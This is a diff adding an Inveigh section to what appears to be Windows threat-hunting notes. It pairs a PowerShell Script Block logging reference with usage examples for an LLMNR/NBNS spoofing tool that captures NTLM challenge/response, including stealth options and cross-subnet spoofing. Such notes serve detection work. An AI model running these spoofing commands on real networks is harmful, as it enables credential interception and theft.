@@ -899,3 +899,79 @@ foreach($Event3 in $EventsID3){
 ```powershell
 Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; ID=3} | Where-Object{$_.Properties[16].Value -ilike '445' -and $_.Properties[14].Value -notcontains "10.100.10.253"} | Format-List
 ```
+
+## Inveigh
+
+PowerShell Script Block logging - **Event ID 4104**
+
+```
+Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational log.
+```
+
+[Invoke-Inveigh.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1) is a Windows PowerShell LLMNR/mDNS/NBNS spoofer man-in-the-middle tool with challenge/response capture over HTTP/HTTPS/Proxy/SMB.
+
+```powershell
+PS > Import-Module .\Inveigh.ps1
+PS > Invoke-Inveigh -IP 10.100.11.150
+
+Inveigh 1.3.1 started at 2024-03-20T14:23:25
+Elevated Privilege Mode = Enabled
+WARNING: Windows Firewall = Enabled
+Primary IP Address = 10.100.11.150
+LLMNR/mDNS/NBNS Spoofer IP Address = 10.100.11.150
+LLMNR Spoofer = Enabled
+LLMNR TTL = 30 Seconds
+mDNS Spoofer = Disabled
+NBNS Spoofer = Disabled
+SMB Capture = Enabled
+HTTP Capture = Enabled
+HTTPS Capture = Disabled
+HTTP/HTTPS Authentication = NTLM
+WPAD Authentication = NTLM
+WPAD NTLM Authentication Ignore List = Firefox
+HTTP Reset Delay List = Firefox
+HTTP Reset Delay Timeout = 30 Seconds
+WPAD Default Response = Enabled
+Machine Account Capture = Disabled
+Real Time Console Output = Disabled
+Real Time File Output = Disabled
+WARNING: Run Stop-Inveigh to stop Inveigh
+```
+
+.EXAMPLE Import full module and execute with all default settings.
+```
+Import-Module .\Inveigh.psd1;Invoke-Inveigh
+```
+
+.EXAMPLE Dot source load and execute specifying a specific local listening/spoofing IP.
+```
+. ./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10
+```
+
+.EXAMPLE Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.
+
+```
+Invoke-Inveigh -IP 192.168.1.10 -HTTP N
+```
+
+.EXAMPLE Execute with the stealthiest options.
+```
+Invoke-Inveigh -SpooferRepeat N -WPADAuth Anonymous -SpooferHostsReply host1,host2 -SpooferIPsReply 192.168.2.75,192.168.2.76
+```
+
+.EXAMPLE Execute in order to only inpect LLMNR/mDNS/NBNS traffic.
+```
+Invoke-Inveigh -Inspect
+```
+
+.EXAMPLE Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be zuseful for sending traffic to a controlled Linux system on another subnet.
+
+```
+Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
+```
+
+.EXAMPLE Execute specifying an HTTP redirect response.
+```
+Invoke-Inveigh -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
+```
+ 
